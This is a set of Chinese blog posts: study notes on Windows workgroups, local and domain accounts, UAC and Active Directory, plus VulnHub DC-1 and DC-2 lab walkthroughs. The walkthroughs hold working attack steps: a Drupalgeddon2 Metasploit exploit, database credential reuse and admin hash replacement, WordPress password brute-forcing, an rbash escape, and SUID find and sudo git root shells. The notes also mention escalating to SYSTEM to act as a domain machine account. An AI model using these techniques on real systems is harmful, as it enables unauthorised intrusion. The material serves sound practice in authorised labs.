[{"content":"+++\n工作组介绍 按照不同的计算机功能或工作部门将计算机列入不同的工作组。要是想访问某一个工作组的资源只需要双击该部门的工作组，就可以看到该组内的所有计算机。 目的：在大型网络中，方便管理员去管理设备\n加入工作组 右击计算机图标\u0026mdash;-\u0026gt;属性\u0026mdash;-\u0026gt;高级系统设置\u0026mdash;-\u0026gt;计算机名\u0026mdash;-\u0026gt;更改设置\u0026mdash;-\u0026gt;更改\u0026mdash;-\u0026gt;输入计算机名称和想要加入工作组的名称\u0026mdash;-\u0026gt;确定 创建工作组\n输入的名称在网络中不存在，那么加入工作组就相当于新建了一个工作组，创建之后直接重新启动就可以了。\n退出工作组 只需要把工作组的名称改为想加入的工作组就可以了。 工作组就像一个可以自由退出重新的社团，方便加入和退出。\n工作组的优缺点 优点: 1、方便管理和维护 2、资源分配方便和灵活 缺点: 1、缺乏集中管理与控制的机制 2、没有集中的统一帐户管理 3、只适合小规模用户的使用\nAD活动目录 1 活动目录( Active Directory,AD)是指域环境中提供目录服务的组件，目录用于存储有关网络对象(例如用户、组、计算机、共享资源、打印机和联系人等)的信息。目录服务是指帮助用户快速、准确地从目录中找到其所需要的信息的服务。活动目录实现了 目录服务,为企业提供了网络环境的集中式管理机制 AD活动目录并不是只能存在域控制内，可以安装在域内成员中，但是需要域管理员的用户名和密码 组织单元介绍 1 组织单元(OU)是域中包含的一类目录对象如用户、计算机和组、文件与打印机等资源，是一个容器，可以在OU上部署组策略 创建组织单元 本地工作组 本地工作组中的所有账号密码都存储在本地的电脑文件中。\n一般来说，电脑上存在两种角色，一个是组，一个是用户。一个组可以有多个用户，而一个用户也可以加入多个组。通过给组划分权限，将用户分到对应的组上，用户就有了不同的权限\n位置 计算机管理 \u0026mdash;-\u0026gt;本地用户和组。 本地最高管理员权限 本地最高的管理员用户为Administrator用户。\nAdministrator在家庭版中属于禁用状态，专业版域server版属于开启 Administrator的SID最后一位是500 Administrator用户默认在administrators组中 ==Administrators最后的四位默认是500== 本地普通管理员权限 一般是指加入administratorts组的管理员，但不是administrator用户 普通管理员很多的操作都没有权限，比如增加一个新用户。（可以右键\u0026mdash;\u0026gt;以管理员身份运行cmd添加用户)无法使用这些命令的原因是windows的UAC认证 本地普通用户 在windows中新建的普通用户，没有管理员权限，很多的操作都无法执行，需要管理员认证后才可以执行。（新建用户默认是user组） 普通用户想要以管理员运行cmd的话，需要输入管理员密码认证 本地系统最高权限 system是系统，在windows中主要作为系统服务或进程的最高权限。 ==**Administrator和system权限区别== Administrator是系统内置的管理员用户，而system权限是系统本身的权限，另外在注册表内的一些到地方也是只有系统自己可以访问，Administrator也不能访问。两个权限所负责的不一样，所以并不是说system比administrator的权限大。\n什么是UAC认证 UAC认证是windows7引入的新技术，一般当计算机执行一些影响系统安全的操作时会触发UAC，用户确认后才能执行。 触发条件：\n修改Windows Update配置; 增加或删除用户帐户 改变用户的帐户类型; 改变UAC设置; 安装ActiveX; 安装或卸载程序; 安装设备驱动程序 修改和设置家长控制; 增加或修改注册表; 将文件移动或复制到Program Files或是Windows目录 访问其他用户目录 UAC设置分为四种，始终通知、仅在程序尝试对计算机进行更改时通知，、仅在尝试更改计算机时通知我(不降低桌面亮度）、和从不通知\n输入win+R\u0026ndash;msconfig 设置UAC \u0026mdash; \u0026gt; 工具 \u0026mdash;-\u0026gt;更改UAC设置 注：哪怕设置为从不提醒，普通管理员或普通用户不能使用的命令还是不能使用，只是不弹窗了。 机器用户 Domain Computers组，任何由我们建立的计算机账号都属于该组。 机器账户是指在网络中用于代表计算机或设备的账户。 机器账户的名称通常以计算机名称或计算机GUID作为前缀，如“ZS-PC$\u0026quot;。 机器账户与具体计算机相关联，用于代表计算机进行域认证和访问域资源 system system的中文是系统，在windows中主要作为系统服务或进程的运行账户。 机器用户与system用户的区别 当机器用户加入到域之后，机器账号的密码或同步到域控上， 虽然system账户在本地计算机上是特殊账号，而机器账户是域环境中的账户，但==在某些情况下，例如当本地计算机需要访问域资源时，system账户可能会充当机器账户的角色==。这是因为在域环境中，本地计算机可以使用system账户作为其身份进行域认证和访问授权。但是它们仍然是两个不同的概念，system账户不是专门为域中的机器账户而创建的。\n例如：当我们获取到一台主机的权限时，发现该主机虽然加入了域，但是当前登录的账户不是域账户，那么我们就无法做域信息收集，这时候可以把当前用户的权限提升至system，在特殊情况下system可以当作域内的机器账户使用。\n提权方法：可以使用工具incognito来提权到system的用户。 工具详细使用方法百度。\n","date":"2024-11-02T00:00:00Z","permalink":"https://dxlaboratory.github.io/p/test3-chinese/","title":"内网学习一"},{"content":"+++\n一.信息收集 主机发现 1 arp-scan -l ​\n发现主机\n1 192.168.36.43 扫描目标ip开放端口 1 nmap -sV -p- 192.168.36.43 #-sV 扫描目标主机端口上运行的软件信息 #-p- 扫描全部端口0-65535\n​\n访问80端口\n​\n获取信息 ​\n可以利用kali中的自带工具whatqweb工具\n1 whatweb -v 192.168.36.43 ​\n也可以上网查询其历史漏洞\n​\n二.漏洞利用 Metasploit利用\n1 msfconsole ​\n查询模块\n1 search drupal ​\n利用2018年的这个漏洞（远程代码执行）\n漏洞编号：CVE-2018-7600\nDrupal 6,7,8等多个子版本存在远程代码执行漏洞\n1 use exploit/unix/webapp/drupal_drupalgeddon2 ​\n然后\n1 2 3 set RHOSTS 192.168.36.43 exploit ​\npython进行交换式环境\n1 python -c \u0026#34;import pty; pty.spawn(\u0026#39;/bin/bash\u0026#39;)\u0026#34; ​编辑\nflag1 ​\n查看\n​编辑\n意为每个好的 CMS 都需要一个配置文件 - 你也一样\n查找类似的配置文件\n1 find ./ -name \u0026#34;set*\u0026#34; ​编辑\n查看里面内容\n1 cat sites/default/settings.php ​\nflag2 在其文件中发现flag2和数据库账号密码\n​\nflag3 进入数据库\n1 mysql -udbuser -pR0ck3t ​\n查看数据库\n​编辑\n使用drupaldb这个库并查看其所有的表\n​\n查看user表的数据, 可以看到加密后的密码\n1 SDvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR ​\n发现密码是加密的，drupal中加密脚本在/var/www/script目录下的/password-hash.sh 用加密脚本写一个密码，然后去替换数据库中的密码值\n​\n还真有，这就好办了，直接设置密码生成明文123456然后进行密文替换就好了\n1 php scripts/password-hash.sh 123456 ​\n进入mysql数据库，替换admin对应的密码\n1 update drupaldb.users set pass=\u0026#39;$S$DNi3rZe1FTcrFGWf7hi1XDhGjut5he6qHCCNidUj4lNk9VYDozbp\u0026#39; where name=\u0026#39;admin\u0026#39;; ​\n成功替换密码，然后进行登录得到flag3\n​\nflag4 Special PERMS will help FIND the passwd - but you\u0026rsquo;ll need to -exec that command to work out how to get what\u0026rsquo;s in the shadow.\nFlag3提示词有perms、find、-exec、shadow共四个特殊提示词\n提示看一下shadow\n​编辑\n无权访问 看一下密码\n1 cat /etc/passwd ​\n三.提权 suid提权 1 2 3 find / -perm -u=s -type f 2\u0026gt;/dev/null find / -user root -perm -4000 -print 2\u0026gt;/dev/null find / -user root -perm -4000 -exec ls -ldb {} \\; ​\nflag5 使用find命令提权\n1 find ./ aaa -exec \u0026#39;/bin/sh\u0026#39; \\; ​\n成功拿下\n","date":"2024-10-31T00:00:00Z","permalink":"https://dxlaboratory.github.io/p/test1-chinese/","title":"DC-1"},{"content":"前言 与 DC-1 非常相似，DC-2 是另一个专门建造的易受攻击实验室，目的是获得渗透测试领域的经验。 与最初的 DC-1 一样，它的设计考虑到了初学者。 必须具备 Linux 技能和熟悉 Linux 命令行，以及具备一些基本渗透测试工具的经验。 就像 DC-1 一样，有五个标志，包括最后一个标志。 再说一次，就像 DC-1 一样，这些标志对初学者很重要，但对有经验的人来说并不那么重要。 简而言之，唯一真正重要的标志是最后一面旗帜。 对于初学者来说，Google 是您的朋友。嗯，除了所有的隐私问题等。 我还没有探索实现 root 的所有方法，因为我放弃了我一直在努力的上一个版本，除了基本操作系统安装之外，我完全从头开始。\n[TOC]\n实验环境： 下载链接： https://www.vulnhub.com/entry/dc-1,292/\n（下载慢，放到迅雷里面）\nVMware环境配置 必须是NAT模式，且攻击机也是NAT模式\n攻击步骤 一、信息收集 查看自己的IP地址，使用nmap进行同网段扫描\n1 2 3 ifconfig ip:192.168.26.128 nmap -sP 192.168.26.128/24 目标IP：192.168.26.129\n扫描该IP端口及服务\n1 nmap -p- -sV 192.168.26.129 结果\n1 2 3 4 5 6 7 8 9 10 11 12 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-27 23:26 EDT Nmap scan report for 192.168.26.129 Host is up (0.00062s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.10 ((Debian)) 7744/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0) MAC Address: 00:0C:29:F4:BE:15 (VMware) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 7.27 seconds 一个http的80端口，一个7744的ssh服务\n如果访问打不开网站的话，说明网站被重定向了\n添加一下主机就行了\n1 2 vim /etc/hosts 192.168.26.129 dc-2 flag1 打开页面发现flag标志\n意思：\n让我们找会员的登录密码，登录一个人后给下一个flag\n二、渗透阶段 flag2 cewl介绍:\n是一个用于生成自定义字典文件的工具，通常用于渗透测试和密码破解。它通过爬取目标网站，提取其中的单词、短语和其他文本信息，以便生成一个用于攻击的字典文件。\n扒一下网站，看看有什么\n1 cewl http://dc-2 -w passwd.txt 再扫描一下目录\n1 dirb http://dc-2 扫描到登录界面\n有密码了，现在只要枚举一下用户名\n1 wpscan --url http://dc-2/ -e u //枚举用户名字 枚举出来的用户名\n1 2 3 admin tom jerry 然后创建一个user.txt文件\n1 touch user.txt 1 2 3 echo \u0026#34;admin\u0026#34; \u0026gt;\u0026gt; user.txt echo \u0026#34;tom\u0026#34; \u0026gt;\u0026gt; user.txt echo \u0026#34;jerry\u0026#34; \u0026gt;\u0026gt; user.txt 爆破登录框\n1 wpscan --url http://dc-2/ -U user.txt -P passwd.txt 拿到用户和密码进行登录\n1 2 3 [!] Valid Combinations Found: Username: jerry, Password: adipiscing Username: tom, Password: parturient 到处点一点拿到flag2\n意思：\n如果你不能利用WordPress并走捷径，还有另一种方法。\n希望你找到了另一个切入点。\nflag3 前面有一个7744端口的ssh远程连接服务\n1 ssh tom@192.168.26.129 -p 7744 进行连接登录\nls-l查看文件目录，有一个flag3.txt\ncat 查看该文件发现权限不足\n查看可用的命令\n1 2 3 4 5 6 compgen -c //查看可以使用的指令 less scp ls vi 发现有个vi,用这个命令打开该文件\n1 vi flag3.txt 拿到flag3\n1 poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes. 意思：\n可怜的老汤姆总是追着杰瑞跑。也许他应该为他造成的所有压力感到自豪。\nflag4 提示：大概意思就是提权\n打开一个文件，用vi去编辑，然后提权\n1 2 3 vi flag3.txt :set shell=/bin/sh :shell 执行\n1 2 3 su cd .. ls -l 该目录下有 tom和jerry\n到jerry用户下面\n1 2 cd jerry vi flag4.txt flag4.txt\nood to see that you\u0026rsquo;ve made it this far - but you\u0026rsquo;re not home yet. You still need to get the final flag (the only flag that really counts!!!). No hints here - you\u0026rsquo;re on your own now. :-) Go on - git outta here!!!!\nflag5 切换到jerry用户下面\n1 2 3 4 5 6 7 exit BASH_CMDS[su]=/bin/sh su xport PATH=$PATH:/bin/ export PATH=$PATH:/usr/bin/ su jerry 输入jerry的密码，前面收集爆破到的密码 三、提权 使用git提权即可\n1 2 3 sudo git help config #这边直接输下面的命令，不用打： !/bin/sh 1 2 3 su cd /root cat final-flag.txt flag5\nCongratulatons!!! A special thanks to all those who sent me tweets and provided me with feedback - it\u0026rsquo;s all greatly appreciated. If you enjoyed this CTF, send me a tweet via @DCAU7.\n总结： 希望对大家有帮助\n","date":"2024-10-31T00:00:00Z","permalink":"https://dxlaboratory.github.io/p/test2-chinese/","title":"DC-2"},{"content":"+++\n域介绍 什么是域 它是一个有安全边界的计算机集合，一个域中的用户无法访问另一个域中的资源。用户想要进入域和进入域内后想要访问什么资源也要有对应的权限 工作组就相当于在大学，域相当于在高中，工作组可以随机进入，没有统一管理用户。域不可以随意进入，并且存在统一管理用户 单域和多域 在一个域内，一般至少要用两台域服务器，一台作为DC，一台作为备份DC 在多个域中，需要每个域都有自己的DC 父域和子域 一般来说在多个域中，第一个域称为父域，各分部的域称为该域的子域 域名一般为xxx.xxx。而子域的为xxx.xxx.xx.例：父域为：abc.com,那么子域一般为sec.abc.com,yunwei.abc.com这种\n域树和域森林 域树 域树是多个域通过建立信任关系组合的继集成。两个域之间想要互相访问需要建立信任关系。 （或者说由一个父域和多个子域组成的关系组叫做域树） 域森林 多个域树通过建立信任关系组合成的集合。 比如说一家公司兼并了另一家公司，自家公司的域树为abc.com,兼并的公司域树为abc.net，那么abc.net无法挂在域abc.com下。那么它们两个就需要建立信任关系达到链接的目的。\nDC域控 一般来说，一个域里面至少要有两台域服务器，一个DC（域控服务器），一个备份DC ![image-20241104230120068](三、域.assets/image-20241104230120068.png 一般来说， 进入域环境中优先拿下DC服务器。\n域环境搭建 搭建域的网络环境 DC机器搭建 域内主机搭建 加入域和退出域 准备一台DC虚拟机，两台正常用户机 在vm虚拟机上设置DC的IP（192.168.41.0）网关（192.168.41.2）并且设置net模式。 vm配置 DC本机配置 在服务器管理器内\u0026mdash;-\u0026gt; 添加角色和功能\u0026mdash;-\u0026gt;前面三个默认，服务器角色选择域服务与DNS服务\u0026mdash;-\u0026gt;剩余全部下一步（如果密码过于简单，在安装过程中可能会报错） 将DC升级为域控制服务器。(设置密码，域名称等) 域内主机搭建 windows7 搭建成功的话可以ping的通 加入和退出域 在vm内，域内主机都要设置为net模式 加入域 管理工具 \u0026mdash;-\u0026gt; AD用户和计算机 添加了一个域用户，在另一台还未加入域环境的主机，加入域环境 返回域内机器，设置\u0026mdash;\u0026gt;关于\u0026mdash;-\u0026gt;重命名此电脑\u0026mdash;\u0026gt;更改 退出域将隶属于改为工作组就可以了（需要提供域管理员的用户名和密码)\n域信任关系 什么是信任关系 域就像一个边界，域内的用户账户只能在域本域内使用，而信任关系就像是在两个域之间搭建一座桥，让域用户可以跨域使用 内外部信任关系 内部信任 内部信任是指在同一个林中域之间的信任关系，这种信任关系是可传递的\n1 在域树中的所有域都是双向信任关系，在创建一个新的子域时，系统会在新的子域和父域之间自动创建双向信任关系。 外部信任关系 外部信任关系是指不同域之间的信任关系，这种一般是单向或双向不可传递的 A域与B域之间建立外部信任关系，但是A域没有与B域的子域不存在信任关系。\n域内用户 域内用户组介绍 电脑加入到域，使用域内的用户进行登录。域内存用户的信息放在域控（DC）上， 添加用户或修改密码都在域控上执行。 Domain Admins组 在域控主机中的Domain Admins（域管理员组）中的用户，拥有完整的管理员权限。该组内的所有用户都会添加到每台域成员的Domain Admins中。这样就可以获取域中所有计算机的所有权 Administrators组 如果添加到位置是在域控的Administrators组中，那么添加的账号只是域控这台主机的管理员权限，并不是所有域成员机器的管理员权限。 Enterprise Admins组 Enterprise Admins（企业系统管理员组）是域森林或根域中的一个组。这个组在域森林中的每个域内都是Administrators组的成员。对所有==域控制器都要完全访问权限== Domain users组 Domain users（域成员组），在默认的情况下所有加入域内的主机都是在这个组内， 在域内的users组 Domain Computers组 任何由域管理员建立的账号都属于这个组 域机器介绍 机器在加入到域之后可以使用域用户登录，也可以使用本机用户登录。 区别：\n本地用户登录，是存放在本地文件中，然后本地进行校验。而域内用户，是要通过DC的认证之后才能登录，用户信息存放唉域控上 本地用户登录主要是对比NTLM HASH值，域认证是通过Kerberos认证。 机器可以选择本地登录或域用户登录，本地用户 机器名\\用户名 域 内用户 域名\\用户名。 域内最高管理员权限 域内最高管理员权限是域控机器上的administrator，它是没有UAC认证的，它也是每个域内机器的本地管理员和机器名administrator具有相同的权限，SID也是500 登录方式： 域名\\用户名 密码为域用户的密码 本地用户登录方式 主机名\\用户名 密码为用户对应密码 ","date":"2024-10-31T00:00:00Z","permalink":"https://dxlaboratory.github.io/p/test-chinese/","title":"域"}]